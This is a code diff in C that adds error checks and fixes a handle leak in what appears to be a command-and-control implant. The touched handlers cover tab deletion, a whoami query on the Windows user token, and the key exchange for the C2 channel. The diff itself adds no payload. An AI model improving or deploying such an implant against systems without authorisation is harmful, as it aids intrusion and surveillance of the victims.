@@ -200,7 +200,11 @@ static tlv_pkt_t *builtin_delete_tab(c2_t *c2)
     int tab_id;
 
     core = c2->data;
-    tlv_pkt_get_u32(c2->request, TLV_TYPE_INT, &tab_id);
+
+    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_INT, &tab_id) < 0)
+    {
+        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
+    }
 
     if (tabs_delete(&core->tabs, tab_id) == 0)
     {
@@ -333,9 +337,11 @@ DWORD get_user_token(LPVOID pTokenUser, DWORD dwBufferSize)
 	if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwBufferSize, &dwReturnedLength))
 	{
 		log_debug("* Failed to get token information for thread/process\n");
+		CloseHandle(hToken);
 		return -1;
 	}
 
+	CloseHandle(hToken);
 	return 0;
 }
 #endif
@@ -390,9 +396,17 @@ static tlv_pkt_t *builtin_whoami(c2_t *c2)
 		return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
 	}
 
-    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
 	domainName = wchar_to_utf8(cbDomainOnly);
 	userName = wchar_to_utf8(cbUserOnly);
+
+	if (domainName == NULL || userName == NULL)
+	{
+		free(domainName);
+		free(userName);
+		return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
+	}
+
+    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
 
 	_snprintf(cbUsername, 512, "%s\\%s", domainName, userName);
 	free(domainName);
@@ -505,7 +519,11 @@ static tlv_pkt_t *builtin_secure(c2_t *c2)
     }
     pkey_length++;
 
-    tlv_pkt_get_u32(c2->request, TLV_TYPE_INT, &algo);
+    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_INT, &algo) < 0)
+    {
+        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
+    }
+
     c2->crypt->next_algo = algo;
 
     if ((key_length = crypt_generate_key(c2->crypt, algo, &c2->crypt->next_key,
